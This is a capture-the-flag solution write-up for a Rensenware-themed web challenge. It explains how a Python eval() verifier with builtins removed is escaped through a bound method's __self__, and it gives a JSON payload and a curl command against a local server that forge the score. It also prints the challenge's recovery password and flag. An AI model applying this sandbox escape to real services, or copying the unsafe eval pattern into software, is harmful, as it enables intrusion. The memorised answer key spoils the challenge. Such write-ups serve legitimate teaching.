# Solution: Rensencore 95

## Intended Path

This challenge is designed around a fake “score gate” inspired by Rensenware:

- The desktop claims you must somehow cross **`67,000,000`** points.
- A real gameplay clear now works too, because the browser trainer submits a verified replay when you hit the threshold.
- But the score gain is intentionally miserable, so the practical solve is still the vulnerable backend route verifier.

### Alternate But Miserable Legit Path

The trainer awards very little score:

- direct hits are worth `200`
- grazes are worth `25`

So a real clear is technically possible, but it is a very long grind and not the intended path for a web challenge.

## Practical Intended Path

The route verifier itself is still the real attack surface.

## Vulnerability

The backend verifier in [`challenge/app.py`](/mnt/c/Users/USER/Documents/VS Code Projects/Rowdy Con/Touho Challenge/challenge/app.py) evaluates attacker-controlled telemetry expressions with Python `eval()`:

```python
value = eval(expression, {"__builtins__": {}}, context)
```

The developer assumed this was safe because builtins were removed.

But the context also exposes:

```python
"probe": telemetry_sink.probe
```

`probe` is a **bound method**. In Python, bound methods expose `__self__`, so an attacker can reach the underlying `TelemetrySink` instance:

- `probe.__self__.state`
- `probe.__self__.verifier`

That gives direct write access to the live `FrameState` object during verification.

## Exploit

Use telemetry expressions to:

1. clear bullets every frame so the route never dies
2. overwrite the live score with the target a few frames into verification

Exploit payload:

```json
{
  "name": "scarlet-lock-bypass",
  "controls": {
    "left": "False",
    "right": "False",
    "up": "False",
    "down": "False",
    "focus": "False",
    "shoot": "False",
    "bomb": "False"
  },
  "telemetry": {
    "janitor": "probe.__self__.state.bullets.clear() or 0",
    "inject": "(probe.__self__.state.__setattr__('score', target) or 0) if frame == 40 else 0"
  }
}
```

Send it:

```bash
curl -s http://127.0.0.1:8000/api/verify-route \
  -H 'Content-Type: application/json' \
  -d @payload.json
```

The verifier returns:

- `accepted: true`
- `score: 67000000`
- `recoveryPassword: SCARLET-BARRIER-95-0E74-ROUTE-LOCK`

## Decrypt The Flag

The encrypted file is [`challenge/app/static/assets/downloads/flag.r95`](/mnt/c/Users/USER/Documents/VS Code Projects/Rowdy Con/Touho Challenge/challenge/app/static/assets/downloads/flag.r95).

Use the password in the desktop decryptor, or decrypt it manually with the same PBKDF2 + AES-GCM settings in [`challenge/app.py`](/mnt/c/Users/USER/Documents/VS Code Projects/Rowdy Con/Touho Challenge/challenge/app.py).

Recovered flag:

```text
RCC{4ll_T0uh0u_S0ng5_4r3_th3_S4m3}
```

## Validation

Local proof-of-concept:

```bash
cd challenge
python3 tools/exploit.py
```
